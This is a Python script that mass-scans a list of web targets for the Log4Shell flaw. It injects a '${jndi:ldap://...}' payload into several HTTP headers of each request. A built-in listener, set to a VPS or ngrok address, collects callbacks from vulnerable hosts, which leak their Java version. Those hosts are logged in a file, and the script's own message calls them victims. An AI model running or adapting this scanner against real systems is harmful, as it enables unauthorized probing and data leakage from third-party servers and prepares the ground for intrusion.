import requests
import socketserver
import threading
import datetime
import signal
import sys
from thread import ThreadPool
import random
import string
if len(sys.argv) != 2:
    print('[!] Usage: python3 run.py <list>')
    exit(0)

data_vulen = dict()
SERVER = 'VPS_IP:9999' ## or using ngrok tcp

class TCPHandler(socketserver.BaseRequestHandler):
    def handle(self):        
        sock = self.request
        sock.recv(1024)
        sock.sendall(b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a')

        data = sock.recv(1024)
        data = data[9:]

        data = data.decode('utf-8', errors='ignore').split('\n')[0]
        if data != '' and len(data) > 1:
            identifier, version = data.split('-', 2)
            data_vulen[identifier] = version

class TCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

def random_str(length: int) -> str:
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

print('Starting TCP server ... For recieving data from victim.')
server = TCPServer(('0.0.0.0', 9999), TCPHandler)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()
print('[+] Starting scan ...\n')

def save(filename: str, data: str):
    with open(filename, 'a+') as f:
        f.write(data + '\n')
    f.close()

def check_vuln(target: str) -> dict:
    if not target.startswith('http'):
        target = 'http://' + target
    random_num = random_str(7)
    payload = '${jndi:ldap://' + SERVER + '/' + random_num + '-${java:version}}'
    try:
        r = requests.get(target, headers={
            'User-Agent': payload,
            'X-Api-Version': payload,
            'Referer': payload,
            'Accept': payload,
        }, verify=False, timeout=30)
    except Exception as e:
        print(e)
        print('[!] Error: ', target)
        return 0
    count = 0
    data_to_return = {}
    while count <= 10:
        if data_vulen.get(random_num):
            data_to_return = {'vuln': True, 'version': data_vulen.get(random_num)}
            data_vulen.pop(random_num)
            break;
        else:
            data_to_return = {'vuln': False}
        count += 1
    if data_to_return.get('vuln'):
        print('[+] Found vulnerability: ', target, '| Java Version: ', data_to_return.get('version'))
        save('vuln.txt', target + ' | Java Version: ' + data_to_return.get('version'))
    else:
        print('[!] Not found vulnerability: ', target)
    return 0

def signal_handler(sig, frame):
    print('\n[!] Exiting ...')
    server.shutdown()
    server.server_close()
    exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    lists = open(sys.argv[1], 'r').read().split('\n')
    Pool = ThreadPool(5)
    for target in lists:
        Pool.add_task(check_vuln, target)
    Pool.wait_completion()
    server.shutdown()
    server.server_close()